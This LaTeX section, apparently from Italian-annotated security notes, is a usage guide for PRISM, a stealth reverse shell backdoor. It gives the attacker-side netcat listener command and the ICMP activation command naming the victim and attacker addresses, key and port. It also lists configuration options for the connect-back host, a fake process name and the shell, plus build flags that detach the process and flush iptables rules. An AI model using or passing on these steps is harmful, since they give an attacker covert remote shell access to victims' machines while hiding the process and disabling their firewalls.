%https://github.com/andreafabrizi/prism
\section{Prism}
%NON COMPATIBILE CON PYTHON3 DA RISCRIVERE
PRISM is an user space stealth reverse shell backdoor.
It can works in two different ways: ICMP and STATIC mode.

\subsection{ICMP mode}
Using this operation mode the backdoor waits silently in background for a specific ICMP packet containing the host/port to connect back and a private key to prevent third party access.
\begin{itemize}
    \item First, run netcat on the attacker machine to wait for incoming connection from the backdoor
    \begin{lstlisting}[language=bash, caption=Attacker machine netcat listener]
        nc -l -p 6666 
    \end{lstlisting}
    \item Using the sendPacket.py script (or another packet builder) send the activation packet to the backdoor
    \begin{lstlisting}
        ./sendPacket.py 192.168.0.1 p4ssw0rd 192.168.0.10 6666
    \end{lstlisting}
    %192.168.0.1 is the victim machine running prism backdoor
    %p4ssw0rd is the key
    %192.168.0.10 is the attacker machine address
    %6666 is the attacker machine port
    \item The backdoor will connect back to netcat!
\end{itemize}

\subsection{Instalaltion}
Get the code git clone https://github.com/andreafabrizi/prism.git
\vspace{1ex} \newline
Before building, you have to configure the backdoor editing the source code.
Following the configuration parameters description:
\begin{itemize}
    \item STATIC mode:
    REVERSE_HOST: Machine address to connect back
    REVERSE_PORT: Machine port to connect back
    RESPAWN_DELAY: Time, in seconds, between each connection
    \item ICMP mode:
    ICMP_KEY: Key/Password to activate the backdoor
    \item Generic parameters:
    MOTD: Message to be printed at the backdoor connection
    SHELL: Shell to execute
    PROCESS_NAME: Fake process name
\end{itemize}

\subsection{Building}
gcc <..OPTIONS..> -Wall -s -o prism prism.c
\vspace{1ex} \newline
Available GCC options:
-DDETACH #Run the process in background
-DSTATIC #Enable STATIC mode (default is the ICMP mode)
-DNORENAME #Doesn't renames the process
-DIPTABLES #Try to flush all iptables rules
\vspace{1ex} \newline
Example:
gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c




